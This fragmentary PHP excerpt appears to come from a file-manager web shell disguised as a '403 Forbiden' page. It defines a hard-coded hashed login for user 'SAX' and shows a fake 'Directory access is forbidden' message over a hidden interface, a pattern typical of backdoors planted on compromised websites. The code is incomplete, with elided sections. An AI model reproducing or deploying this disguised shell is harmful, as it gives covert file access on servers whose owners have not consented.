...
define('VERSION', '59.68'); 
define('APP_TITLE', '403 Forbiden'); 
$use_auth = true; 
$auth_users = array(
    'SAX' => '$2y$10$tGhhBEZXP/PHt1Mebv6tw.fdJgL1PcCGEx27/rXR0uP//lgwXtRdC',
); 
...
if ($use_auth) {
    if (isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_ID]['logged']])) { 
        ...
        fm_show_header_login();
        ?>
        <section class="h-100" ></br>
        <p class="dire">Directory access is forbidden.</p><style>
        .dire {
  font-family: "Times New Roman", Times, serif;
  font-weight: 400;
    font-size: 16px;
}</style>
            <div class="container h-100" hidden>
